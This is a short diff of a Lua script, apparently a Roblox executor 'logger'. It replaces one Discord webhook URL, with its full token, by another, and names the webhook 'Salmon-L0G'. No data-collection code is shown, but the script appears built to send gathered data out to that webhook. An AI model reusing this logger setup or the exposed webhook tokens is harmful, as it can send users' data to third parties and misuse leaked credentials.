@@ -10,7 +10,7 @@ local webhookcheck =
    "Prob swift ngl"
 
 local url =
-   "https://discord.com/api/webhooks/1362837174764044581/2m4M77kG36Sz3f7mJDsoBmG3qa3MFLXUHoCfMiTjxhBryGQZu-kNVs2l97Z0ms-3ynwH" --pretty obvious what to do here
+   "https://discord.com/api/webhooks/1373465597903372308/osuLSMh8U5uS_Lo-PpAdl8c5uo0IVHmfIxBulmMXoY6uVUdUX5VBW6ctfg6p3hFjQgVI" --pretty obvious what to do here
 local data = {
             ["username"] = "Salmon-L0G", --webhook name thing idk
             ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
